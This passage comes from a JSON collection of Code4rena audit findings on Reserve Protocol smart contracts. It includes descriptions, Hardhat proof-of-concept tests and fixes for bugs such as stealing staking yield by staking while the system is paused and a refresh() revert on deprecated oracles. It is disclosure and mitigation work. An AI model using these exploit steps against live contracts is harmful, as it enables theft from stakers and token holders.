\n\n[https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99)   \n\nThis then can lead to issues in any places where the prices of `RTokenAsset`s are used.  \n\n## Proof of Concept\nHere is the affected line:  \n\n[https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275)  \n\n```solidity\npotentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume);\n```\n\nThis line is executed for every asset in the `AssetRegistry` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242)).  \n\nSo for every asset in the `AssetRegistry` a potential dust loss of `minTradeVolume` is added.  \n\nThe following scenario shows why this is wrong:  \n\n```\nassume minTradeVolume = $50\n\nassume further the following:\nasset1 with low value $1\nasset2 with low value $1\nasset3 with low value $1\nasset4 with low value $200\n\nCurrently potentialDustLoss will be 4*minTradeVolume = $200.\nSo assetsLow = $203 - $200 = $3.\n\nDust loss should not be calculated with $50 for the first 3 assets.\nDust loss for an asset should be capped at its low value.\nSo dust loss alltogether should be $1 + $1 + $1 + $50 = $53.\n\nSo assetsLow should be $1+$1+$1+$200 - $53 = $150.\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nI suggest that an asset can only incur as much dust loss as its balance is.  \nIf the protocol only holds `$5` of asset A then this should not cause a dust loss of say `$10`.  \n\nThe fix first saves the `assetLow` value which should be saved to memory because it is now needed two times then it caps the dust loss of an asset at its low value:  \n\n```\ndiff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol\nindex 648d1813..b5b86cac 100644\n--- a/contracts/p1/mixins/RecollateralizationLib.sol\n+++ b/contracts/p1/mixins/RecollateralizationLib.sol\n@@ -261,7 +261,8 @@ library RecollateralizationLibP1 {\n \n             // Intentionally include value of IFFY/DISABLED collateral when low is nonzero\n             // {UoA} = {UoA} + {UoA/tok} * {tok}\n-            assetsLow += low.mul(bal, FLOOR);\n+            uint192 assetLow = low.mul(bal,FLOOR);\n+            assetsLow += assetLow;\n             // += is same as Fix.plus\n \n             // assetsHigh += high.mul(bal, CEIL), where assetsHigh is [0, FIX_MAX]\n@@ -272,7 +273,7 @@ library RecollateralizationLibP1 {\n             // += is same as Fix.plus\n \n             // Accumulate potential losses to dust\n-            potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume);\n+            potentialDustLoss = potentialDustLoss.plus(fixMin(rules.minTradeVolume, assetLow));\n         }\n \n         // Account for all the places dust could get stuck\n```",
      "summary": "\nThis bug report is related to the RecollateralizationLib.basketRange function of the Reserve Protocol. This function is used by the RecollateralizationLib.prepareRecollateralizationTrade and RTokenAsset to calculate the value of the RTokenAsset. The bug is caused by the RecollateralizationLib.totalAssetValue function which returns a value for assetsLow that is too low. This in turn causes the range.bottom value that the RecollateralizationLib.basketRange function returns to be too low. \n\nThe impact of this bug is two-fold: \n\n1. The RecollateralizationLib.prepareRecollateralizationTrade function passes the range to the RecollateralizationLib.nextTradePair function. Since range.bottom is too low, the needed amount is too low, causing the if statement to not be executed in some cases when it otherwise would be executed. This causes recollateralization trades to not buy as much assets as they could buy, leading to a direct loss to RToken holders. \n\n2. The RTokenAsset underestimates its low and lotLow prices, leading to issues in any places where the prices of RTokenAssets are used. \n\nThe affected line is at https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275. It is wrong because it adds a potential dust loss of minTradeVolume for every asset in the AssetRegistry. The recommended mitigation step is to cap the dust loss of an asset at its low value. The fix saves the assetLow value which should be saved to memory because it is now needed two times, and then caps the dust loss of an asset at its low value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/106",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "16031",
      "title": "[M-21] Loss of staking yield for stakers when another user stakes in pause/frozen state",
      "impact": "MEDIUM",
      "content": "\nIt is possible for a user to steal the yield from other stakers by staking when the system is paused or frozen.\n\nThis is because staking is allowed while paused/frozen, but `_payoutRewards()` is not called during so. Staking rewards are not paid out to current stakers when a new staker stakes, so the new staker immediately gets a portion of the rewards, without having to wait for a reward period.\n\n```sol\nfunction stake(uint256 rsrAmount) external {\n\trequire(rsrAmount > 0, \"Cannot stake zero\");\n\t\n\tif (!main.pausedOrFrozen()) _payoutRewards();\n\t...\n}\n```\n\n### Proof of concept\n\nA test case can be included in `ZZStRSR.test.ts` under 'Add RSR / Rewards':\n\n```js\n    it('Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state', async () => {\n      await rsr.connect(addr1).approve(stRSR.address, stake)\n      await stRSR.connect(addr1).stake(stake)\n\n      await advanceTime(Number(config.rewardPeriod) * 5)\n      await main.connect(owner).pause()\n\n      await rsr.connect(addr2).approve(stRSR.address, stake)\n      await stRSR.connect(addr2).stake(stake)\n\n      await main.connect(owner).unpause()\n\n      await stRSR.connect(addr1).unstake(stake)\n      await stRSR.connect(addr2).unstake(stake)\n      await advanceTime(Number(config.unstakingDelay) + 1)\n\n      await stRSR.connect(addr1).withdraw(addr1.address, 1)\n      await stRSR.connect(addr2).withdraw(addr2.address, 1)\n      const addr1RSR = await rsr.balanceOf(addr1.address)\n      const addr2RSR = await rsr.balanceOf(addr2.address)\n      console.log(`addr1 RSR = ${addr1RSR}`)\n      console.log(`addr2 RSR = ${addr2RSR}`)\n      expect(Number(addr1RSR)).to.be.approximately(Number(addr2RSR), 10)\n    })\n```\n\nNote that `await advanceTime(Number(config.rewardPeriod) * 5)` can be before or after the pause, same result will occur.\n\nRun with:<br>\n`yarn test:p1 --grep \"Audit\"`\n\nOutput:\n\n```shell\naddr1 RSR = 10000545505689818061216\naddr2 RSR = 10000545505689818061214\n\n  StRSRP1 contract\n    Add RSR / Rewards\n      ✔ Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state (1504ms)                                                                                       (1504ms)\n\n\n  1 passing (2m)\n```\n\nThe PoC demonstrates that the staker2 stole half of the rewards from staker1. staker1 staked for 5 `rewardPeriod`, staker2 did not have to wait at all, but still received half of the reward share.\n\n### Impact\n\nThis should fall into \"Theft of unclaimed yield\", suggesting High risk. But the amount of RSR that can be stolen depends on the liveliness of the staking pool (how often `_payoutRewards()` is called). If the time window between the last `stake(...)/unstake(...)/payoutRewards(...)` and `pause()/freezeUntil(...)` is small, then no/less RSR yield can be stolen.\n\n`system-design.md` rewardPeriod:\n\n    Default value: `86400` = 1 day\n    Mainnet reasonable range: 10 to 31536000 (1 year)\n\nFor RTokens which choose a smaller value for `rewardPeriod`, the risk is higher. If `rewardPeriod = 86400` like recommended, then for this attack to occur, no one must have called `stake(...)/unstake(...)/payoutRewards(...)` for 1 day before the pause/freeze occured.\n\nLikelihood is Low for a reasonably set `rewardPeriod` and lively project. Therefore submitting as Medium risk.\n\n### Recommendations\n\nI'm unsure of why staking is allowed when paused/frozen and the reason for the line:\n\n```sol\n if (!main.pausedOrFrozen()) _payoutRewards();\n```\n\nThe team should consider the reason for the above logic.\n\nIf the above logic is required, then I would suggest that `poke()` in `Main.sol` be called inside of `pause()` and `freezeUntil(...)` to update the state **before** pausing/freezing. Since `distribute(...)` has modifier `notPausedOrFrozen`, I would assume in pause/frozen state, no RSR is sent to stRSR contract (i.e. no rewards when paused/frozen) so this recommendation should be sufficient in preventing the issue.\n\n**[pmckelvy1 (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/148#issuecomment-1406612686)**\n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > \tThis PR makes the AssetRegistry more resilient to bad collateral during asset unregistration, and disables staking when frozen.<br>\n> [reserve-protocol/protocol#623](https://github.com/reserve-protocol/protocol/pull/623)\n\n**Status:** Mitigation confirmed. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/6), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/71), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/44).\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the Reserve Protocol's StRSR contract. It is possible for a user to steal the yield from other stakers by staking when the system is paused or frozen. This is because staking is allowed while paused/frozen, but the `_payoutRewards()` function is not called during this time. The bug is classified as a Medium risk due to the amount of RSR that can be stolen depending on the liveliness of the staking pool. \n\nThe bug can be tested by including a test case in the `ZZStRSR.test.ts` file and running the `yarn test:p1 --grep \"Audit\"` command. The PoC demonstrates that the staker2 stole half of the rewards from staker1, without having to wait for a reward period. \n\nThe team is recommended to consider the reason for the logic allowing staking while paused/frozen. If the logic is required, then `poke()` in `Main.sol` should be called inside of `pause()` and `freezeUntil(...)` to update the state before pausing/freezing. This should prevent the issue from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/148",
      "tags": [],
      "finders": [
        "__141345__",
        "Soosh"
      ]
    },
    {
      "id": "16030",
      "title": "[M-20] Shortfall might be calculated incorrectly if a price value for one collateral isn’t fetched correctly",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449\n\n\n## Vulnerability details\n\n## Impact\nFunction `price()` of an asset doesn't revert. It [returns values](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L117) `(0, FIX_MAX)` for `low, high` values of price in case there's a problem with fetching it. Code that calls `price()` is able to validate returned values to detect that returned price is incorrect.\n\nInside function `collateralShortfall()` of `RecollateralizationLibP1` [collateral price isn't checked for correctness](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449). As a result incorrect value of `shortfall` might be [calculated](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L452) if there are difficulties to fetch a price for one of the collaterals. \n\n## Proof of Concept\n* https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449\n\n## Recommended Mitigation Steps\nCheck that price is correctly fetched for a collateral.",
      "summary": "\nThis bug report is about a vulnerability in the function `price()` of an asset in the Reserve Protocol. When the function is called, it can return incorrect values of `low` and `high` for the price, if there are difficulties in fetching the price. This can lead to incorrect calculations of `shortfall` in the function `collateralShortfall()` of `RecollateralizationLibP1`.\n\nThe proof of concept for this vulnerability is available in the given link.\n\nThe recommended mitigation step to fix this vulnerability is to check that the price is correctly fetched for a collateral.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/200",
      "tags": [],
      "finders": [
        "severity"
      ]
    },
    {
      "id": "16029",
      "title": "[M-19] In case that unstakingDelay is decreased, users who have previously unstaked would have to wait more than unstakingDelay for new unstakes",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L560-L564\n\n\n## Vulnerability details\n\n## Impact\nUsers who wish to unstake their RSR from StRSR have to first unstake and then wait `unstakingDelay` till they can actually withdraw their stake.\nThe `unstakingDelay` can change by the governance.\nThe issue is that when the `unstakingDelay` is decreased - users that have pending unstakes (aka drafts) would have to wait till the old delay has passed for the pending draft (not only for their pending drafts, but also for any new draft they wish to create. e.g. if the unstaking delay was 6 months and was changed to 2 weeks, if a user has a pending draft that was created a month before the change the user would have to wait at least 5 months since the change for every new draft).\n\n## Proof of Concept\nThe following PoC shows an example similar to above:\n* Unstaking delay was 6 months\n* Bob unstaked (create a draft) 1 wei of RSR\n* Unstaking delay was changed to 2 weeks\n* Both Bob and Alice unstake their remaining stake\n* Alice can withdraw her stake after 2 weeks\n* Bob has to wait 6 months in order to withdraw both that 1 wei and the remaining of the stake\n\n\n```diff\ndiff --git a/test/ZZStRSR.test.ts b/test/ZZStRSR.test.ts\nindex f507cd50..3312686a 100644\n--- a/test/ZZStRSR.test.ts\n+++ b/test/ZZStRSR.test.ts\n@@ -599,6 +599,8 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n       let amount2: BigNumber\n       let amount3: BigNumber\n \n+      let sixMonths = bn(60*60*24*30*6);\n+\n       beforeEach(async () => {\n         stkWithdrawalDelay = bn(await stRSR.unstakingDelay()).toNumber()\n \n@@ -608,18 +610,56 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n         amount3 = bn('3e18')\n \n         // Approve transfers\n-        await rsr.connect(addr1).approve(stRSR.address, amount1)\n+        await rsr.connect(addr1).approve(stRSR.address, amount1.add(1))\n         await rsr.connect(addr2).approve(stRSR.address, amount2.add(amount3))\n \n+        \n         // Stake\n-        await stRSR.connect(addr1).stake(amount1)\n+        await stRSR.connect(addr1).stake(amount1.add(1))\n         await stRSR.connect(addr2).stake(amount2)\n         await stRSR.connect(addr2).stake(amount3)\n \n-        // Unstake - Create withdrawal\n-        await stRSR.connect(addr1).unstake(amount1)\n+        // here\n+        let sixMonths = bn(60*60*24*30*6);\n+        // gov thinks it's a good idea to set delay to 6 months\n+        await expect(stRSR.connect(owner).setUnstakingDelay(sixMonths))\n+        .to.emit(stRSR, 'UnstakingDelaySet')\n+        .withArgs(config.unstakingDelay, sixMonths);\n+\n+        // Poor Bob created a draft when unstaking delay was 6 months\n+        await stRSR.connect(addr1).unstake(bn(1))\n+\n+        // gov revise their previous decision and set unstaking delay back to 2 weeks\n+        await expect(stRSR.connect(owner).setUnstakingDelay(config.unstakingDelay))\n+        .to.emit(stRSR, 'UnstakingDelaySet')\n+        .withArgs(sixMonths, config.unstakingDelay);\n+\n+        // now both Bob and Alice decide to unstake\n+        await stRSR.connect(addr1).unstake(amount1);\n+        await stRSR.connect(addr2).unstake(amount2);\n+\n+      })\n+\n+      it('PoC user 1 can\\'t withdraw', async () => {\n+        // Get current balance for user\n+        const prevAddr1Balance = await rsr.balanceOf(addr1.address)\n+\n+        // 6 weeks have passed, much more than current delay\n+        await advanceTime(stkWithdrawalDelay * 3)\n+\n+\n+        // Alice can happily withdraw her stake\n+        await stRSR.connect(addr2).withdraw(addr2.address, 1)\n+        // Bob can't withdraw his stake and has to wait 6 months\n+        // Bob is now very angry and wants to talk to the manager\n+        await expect(stRSR.connect(addr1).withdraw(addr1.address, 2)).to.be.revertedWith(\n+          'withdrawal unavailable'\n+        )\n+\n+\n       })\n \n+      return; // don't run further test\n       it('Should revert withdraw if Main is paused', async () => {\n         // Get current balance for user\n         const prevAddr1Balance = await rsr.balanceOf(addr1.address)\n@@ -1027,6 +1067,7 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n       })\n     })\n   })\n+  return; // don't run further test\n \n   describe('Add RSR / Rewards', () => {\n     const initialRate = fp('1')\n```\n\n\n## Recommended Mitigation Steps\nAllow users to use current delay even if it was previously higher. I think this should apply not only to new drafts but also for drafts that were created before the change.\nAlternatively, the protocol can set a rule that even if the staking delay was lowered stakers have to wait at least the old delay since the change till they can withdraw.  But in this case the rule should apply to everybody regardless if they have pending drafts or not.",
      "summary": "\nThis bug report is about a vulnerability in the Reserve Protocol's StRSR.sol contract, which affects users who wish to unstake their RSR from StRSR. The issue is that when the unstakingDelay is decreased, users that have pending unstakes (aka drafts) would have to wait till the old delay has passed for the pending draft, even if they create a new draft. This is demonstrated in the proof of concept, which shows an example of Bob and Alice unstaking their remaining stake, with Alice being able to withdraw her stake after 2 weeks, but Bob having to wait 6 months in order to withdraw both the 1 wei and the remaining of the stake.\n\nThe recommended mitigation steps are to allow users to use the current delay even if it was previously higher, or to set a rule that stakers have to wait at least the old delay since the change till they can withdraw.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/210",
      "tags": [],
      "finders": [
        "0xA5DF",
        "Soosh"
      ]
    },
    {
      "id": "16028",
      "title": "[M-18] If name is changed then the domain separator would be wrong",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L803><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L791>\n\nIn `StRSR.sol` the `_domainSeparatorV4` is calculated using the EIP-721 standard, which uses the `name` and `version` that are passed in the init at the function call `__EIP712_init(name, \"1\");`\n\nNow, governance can change this `name` anytime using the following function:\n\n```solidity\nfunction setName(string calldata name_) external governance {\n        name = name_;\n    }\n```\n\nAfter that call the domain separator would still be calculated using the old name, which shouldn’t be the case.\n\n### Impact\n\nThe permit transactions and vote delegation would be reverted if the domain separator is wrong.\n\n### Recommendation\n\nWhile changing the name in setName function, update the domain separator.\n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/211)**\n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR removes the ability to change StRSR token's name and symbol: [reserve-protocol/protocol#614](https://github.com/reserve-protocol/protocol/pull/614)\n\n**Status:** Mitigation confirmed. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/7), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/62), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/42).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the StRSR.sol code which is part of the Reserve Protocol. The vulnerability occurs when the name used in the init function call is changed by governance using the setName function. The problem is that the domain separator is still calculated using the old name, which should not be the case. The impact of this is that permit transactions and vote delegation would be reverted if the domain separator is wrong. The recommended solution is to update the domain separator while changing the name in the setName function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/211",
      "tags": [],
      "finders": [
        "fs0c"
      ]
    },
    {
      "id": "16027",
      "title": "[M-17] refresh() will revert on Oracle deprecation, effectively disabling part of the protocol",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L102\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L149\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/OracleLib.sol#L14-L31\n\n\n## Vulnerability details\n\n\n\n\nThe `Asset.refresh()` function calls `tryPrice()` and catches all errors except errors with empty data.\nAs explained in the [docs](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/docs/solidity-style.md#catching-empty-data) the reason empty errors aren't caught is in order to prevent an attacker from failing the `tryPrice()` intentionally by running it out of gas.\nHowever, an error with empty data isn't thrown only in case of out of gas, in the current way that Chainlink deprecates oracles (by setting `aggregator` to the zero address) a deprecated oracle would also throw an empty error.\n\n\n\n## Impact\nAny function that requires refreshing the assets will fail to execute (till the asset is replaced in the asset registry, passing the proposal via governance would usually take 7 days), that includes:\n* Issuance\n* Vesting\n* Redemption\n* Auctions (`manageTokens()`)\n* `StRSR.withdraw()`\n\n## Proof of Concept\n\nThe [docs](https://github.com/reserve-protocol/protocol/blob/d224c14c398d2727d39d133aa7511e1e6b161833/docs/recollateralization.md#:~:text=If%20an%20asset%27s%20oracle%20goes%20offline%20forever%2C%20its%20lotPrice()%20will%20eventually%20reach%20%5B0%2C%200%5D%20and%20the%20protocol%20will%20completely%20stop%20trading%20this%20asset.) imply in case of deprecation the protocol is expected continue to operate:\n> If an asset's oracle goes offline forever, its lotPrice() will eventually reach [0, 0] and the protocol will completely stop trading this asset.\n\nThe [docs](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/docs/collateral.md#refresh-should-never-revert) also clearly state that '`refresh()` should never revert'\n\n\nI've tracked a few Chainlink oracles that were deprecated on the Polygon network on Jan 11, the PoC below tests an `Asset.refresh()` call with a deprecated oracle.\n\n\n\nFile: `test/plugins/Deprecated.test.ts`\n```typescript\nimport { Wallet, ContractFactory } from 'ethers'\nimport { ethers, network, waffle } from 'hardhat'\nimport { IConfig } from '../../common/configuration'\nimport { bn, fp } from '../../common/numbers'\nimport {\n  Asset,\n  ATokenFiatCollateral,\n  CTokenFiatCollateral,\n  CTokenMock,\n  ERC20Mock,\n  FiatCollateral,\n  IAssetRegistry,\n  RTokenAsset,\n  StaticATokenMock,\n  TestIBackingManager,\n  TestIRToken,\n  USDCMock,\n} from '../../typechain'\nimport {\n  Collateral,\n  defaultFixture,\n} from '../fixtures'\n\nconst createFixtureLoader = waffle.createFixtureLoader\n\n\ndescribe('Assets contracts #fast', () => {\n  // Tokens\n  let rsr: ERC20Mock\n  let compToken: ERC20Mock\n  let aaveToken: ERC20Mock\n  let rToken: TestIRToken\n  let token: ERC20Mock\n  let usdc: USDCMock\n  let aToken: StaticATokenMock\n  let cToken: CTokenMock\n\n  // Assets\n  let collateral0: FiatCollateral\n  let collateral1: FiatCollateral\n  let collateral2: ATokenFiatCollateral\n  let collateral3: CTokenFiatCollateral\n\n  // Assets\n  let rsrAsset: Asset\n  let compAsset: Asset\n  let aaveAsset: Asset\n  let rTokenAsset: RTokenAsset\n  let basket: Collateral[]\n\n  // Config\n  let config: IConfig\n\n  // Main\n  let loadFixture: ReturnType<typeof createFixtureLoader>\n  let wallet: Wallet\n  let assetRegistry: IAssetRegistry\n  let backingManager: TestIBackingManager\n\n  // Factory\n  let AssetFactory: ContractFactory\n  let RTokenAssetFactory: ContractFactory\n\n  const amt = fp('1e4')\n\n  before('create fixture loader', async () => {\n    ;[wallet] = (await ethers.getSigners()) as unknown as Wallet[]\n    loadFixture = createFixtureLoader([wallet])\n  })\n\n  beforeEach(async () => {\n    // Deploy fixture\n    ;({\n      rsr,\n      rsrAsset,\n      compToken,\n      compAsset,\n      aaveToken,\n      aaveAsset,\n      basket,\n      assetRegistry,\n      backingManager,\n      config,\n      rToken,\n      rTokenAsset,\n    } = await loadFixture(defaultFixture))\n\n    // Get collateral tokens\n    collateral0 = <FiatCollateral>basket[0]\n    collateral1 = <FiatCollateral>basket[1]\n    collateral2 = <ATokenFiatCollateral>basket[2]\n    collateral3 = <CTokenFiatCollateral>basket[3]\n    token = <ERC20Mock>await ethers.getContractAt('ERC20Mock', await collateral0.erc20())\n    usdc = <USDCMock>await ethers.getContractAt('USDCMock', await collateral1.erc20())\n    aToken = <StaticATokenMock>(\n      await ethers.getContractAt('StaticATokenMock', await collateral2.erc20())\n    )\n    cToken = <CTokenMock>await ethers.getContractAt('CTokenMock', await collateral3.erc20())\n\n    await rsr.connect(wallet).mint(wallet.address, amt)\n    await compToken.connect(wallet).mint(wallet.address, amt)\n    await aaveToken.connect(wallet).mint(wallet.address, amt)\n\n    // Issue RToken to enable RToken.price\n    for (let i = 0; i < basket.length; i++) {\n      const tok = await ethers.getContractAt('ERC20Mock', await basket[i].erc20())\n      await tok.connect(wallet).mint(wallet.address, amt)\n      await tok.connect(wallet).approve(rToken.address, amt)\n    }\n    await rToken.connect(wallet)['issue(uint256)'](amt)\n\n    AssetFactory = await ethers.getContractFactory('Asset')\n    RTokenAssetFactory = await ethers.getContractFactory('RTokenAsset')\n  })\n\n  describe('Deployment', () => {\n    it('Deployment should setup assets correctly', async () => {\n\n        console.log(network.config.chainId);\n        // let validOracle = '0x443C5116CdF663Eb387e72C688D276e702135C87';\n        let deprecatedOracle = '0x2E5B04aDC0A3b7dB5Fd34AE817c7D0993315A8a6';\n        let priceTimeout_ = await aaveAsset.priceTimeout(),\n         chainlinkFeed_ = deprecatedOracle,\n         oracleError_ = await aaveAsset.oracleError(),\n         erc20_ = await aaveAsset.erc20(),\n         maxTradeVolume_ = await aaveAsset.maxTradeVolume(),\n         oracleTimeout_ = await aaveAsset.oracleTimeout();\n        \n        aaveAsset = await AssetFactory.deploy(priceTimeout_,\n            chainlinkFeed_ ,\n            oracleError_ ,\n            erc20_ ,\n            maxTradeVolume_ ,\n            oracleTimeout_  ) as Asset;\n\n        await aaveAsset.refresh();\n      \n    })\n  })\n\n})\n\n```\n\nModification of `hardhat.config.ts` to set it to the Polygon network:\n```diff\ndiff --git a/hardhat.config.ts b/hardhat.config.ts\nindex f1886d25..53565799 100644\n--- a/hardhat.config.ts\n+++ b/hardhat.config.ts\n@@ -24,18 +24,19 @@ const TIMEOUT = useEnv('SLOW') ? 3_000_000 : 300_000\n const src_dir = `./contracts/${useEnv('PROTO')}`\n const settings = useEnv('NO_OPT') ? {} : { optimizer: { enabled: true, runs: 200 } }\n \n+let recentBlockNumber = 38231040;\n+let jan6Block = 37731612; // causes 'missing trie node' error\n+\n const config: HardhatUserConfig = {\n   defaultNetwork: 'hardhat',\n   networks: {\n     hardhat: {\n       // network for tests/in-process stuff\n-      forking: useEnv('FORK')\n-        ? {\n-            url: MAINNET_RPC_URL,\n-            blockNumber: Number(useEnv('MAINNET_BLOCK', forkBlockNumber['default'].toString())),\n-          }\n-        : undefined,\n-      gas: 0x1ffffffff,\n+      forking: {\n+          url: \"https://rpc.ankr.com/polygon\",\n+          // blockNumber: recentBlockNumber\n+          },\n+          gas: 0x1ffffffff,\n       blockGasLimit: 0x1fffffffffffff,\n       allowUnlimitedContractSize: true,\n     },\n```\n\nOutput:\n```\n  1) Assets contracts #fast\n       Deployment\n         Deployment should setup assets correctly:\n     Error: Transaction reverted without a reason string\n    at Asset.refresh (contracts/plugins/assets/Asset.sol:102)\n    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n    at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1802:23)\n    at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:491:16)\n    at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1522:18)\n    at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:118:18)\n    at async EthersProviderWrapper.send (node_modules/@nomiclabs/hardhat-ethers/src/internal/ethers-provider-wrapper.ts:13:20)\n```\n\nNotes:\n* Chainlink list deprecating oracles only till deprecation, afterwards they're removed from the website. For this reason I wasn't able to trace deprecated oracles on the mainnet\n* I was trying to prove this worked before deprecation, however, I kept getting the 'missing trie node' error when forking the older block. This isn't essential for the PoC so I decided to give up on it for now (writing this PoC was hard enough on its own).\n\n## Recommended Mitigation Steps\nAt `OracleLib.price()` catch the error and check if the error data is empty and the aggregator is set to the zero address, if it is a revert with a custom error. Otherwise revert with the original error data (this can be done with assembly).\nAnother approach might be to check in the `refresh()` function that the `tryPrice()` function didn't revert due to out of gas error by checking the gas before and after (in case of out of gas error only ~1/64 of the gas-before would be left). The advantage of this approach is that it would catch also other errors that might revert with empty data.",
      "summary": "\nThis bug report is about an issue with the `Asset.refresh()` function in the Reserve Protocol. The `refresh()` function calls `tryPrice()` and catches all errors except errors with empty data. The issue is that an error with empty data isn't thrown only in case of out of gas, in the current way that Chainlink deprecates oracles (by setting `aggregator` to the zero address) a deprecated oracle would also throw an empty error. \n\nThe impact of this bug is that any function that requires refreshing the assets will fail to execute, such as issuance, vesting, redemption, auctions, and `StRSR.withdraw()`. To prove this, the bug reporter ran a test on the Polygon network and found that an `Asset.refresh()` call with a deprecated oracle caused a transaction to revert without a reason string.\n\nThe recommended mitigation steps are to catch the error at `OracleLib.price()` and check if the error data is empty and the aggregator is set to the zero address. If it is, a revert with a custom error should be done. Alternatively, it could be checked in the `refresh()` function that the `tryPrice()` function didn't revert due to out of gas error by checking the gas before and after.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
